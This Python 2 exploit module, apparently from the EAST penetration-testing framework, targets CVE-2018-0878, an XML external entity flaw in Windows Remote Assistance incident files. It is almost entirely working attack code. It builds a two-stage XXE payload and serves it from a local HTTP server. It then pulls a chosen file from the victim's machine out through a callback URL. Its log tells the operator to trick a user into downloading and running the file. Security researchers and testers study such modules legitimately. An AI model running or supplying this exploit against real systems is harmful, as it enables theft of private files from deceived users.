#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import thread
import urllib

sys.path.append('./core')
from Sploit import Sploit
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

INFO = {}
INFO['NAME'] = "efa_microsoft_windows_remote_assistance_xxe"
INFO['DESCRIPTION'] = "Windows Remote Assistance - XML External Entity Injection"
INFO['VENDOR'] = "https://www.microsoft.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://krbtgt.pw/windows-remote-assistance-xxe-vulnerability/']
INFO["CVE Name"] = "CVE-2018-0878"
INFO["NOTES"] = """Windows Remote Assistance files ".msrcincident" are prone to XML External Entity attacks allowing remote attackers to gain access to files from a victims computer using a specially crafted malicious .msrcincident file, resulting in remote information / file disclosures.

Tested Windows 7 SP1
"""

INFO['CHANGELOG'] = "29 Mar, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'


OPTIONS = {}
OPTIONS["CALLBACK_IP"] = "127.0.0.1", dict(description = 'Server IP')
OPTIONS["PATH"] = "C:/windows/win.ini", dict(description = 'File path')

STAGE1 = '''<?xml version="1.0" encoding="UTF-8" ?>  
<!DOCTYPE zsl [  
<!ENTITY % remote SYSTEM "http://{}:{}/EaST.xml">  
%remote;%root;%oob;]>'''
STAGE2 = '''<!ENTITY % payload SYSTEM "file:///{}">  
<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://{}:{}/leaked?%payload;'> ">'''
LOG = None

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        
        if 'leaked' in self.path:
            LOG('= File Content =')
            LOG(urllib.unquote(self.path.split("?")[1]))
            LOG('= End of File  =')
            self.send_response(200)
            self.end_headers()
            
        elif 'EaST.msrcincident' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-length', len(STAGE1))
            self.end_headers()
            self.wfile.write(STAGE1)
            
        elif 'EaST.xml' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'text/xml')
            self.send_header('Content-length', len(STAGE2))
            self.end_headers()
            self.wfile.write(STAGE2)
        return
            
    def log_message(self, format, *args):
        pass#LOG(urllib.unquote(args[0]))

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.callback_ip = ''
        self.path = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        self.path = self.args.get('PATH', OPTIONS["PATH"])
    
    def run(self):
        self.args()
        port = 8000
        
        global LOG
        LOG = self.log
        
        global STAGE1
        STAGE1 = STAGE1.format(self.callback_ip, port)
        
        global STAGE2
        STAGE2 = STAGE2.format(self.path, self.callback_ip, port)
        
        self.log('Starting server')
        serv = HTTPServer(('', port), MyHandler)
        thread.start_new_thread(serv.serve_forever, ())
        
        self.log('Server started. Trick user visit http://{}:{}/EaST.msrcincident and run downloaded file'.format(self.callback_ip, port))
        self.log('Wait 120 seconds')
        
        time.sleep(120)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
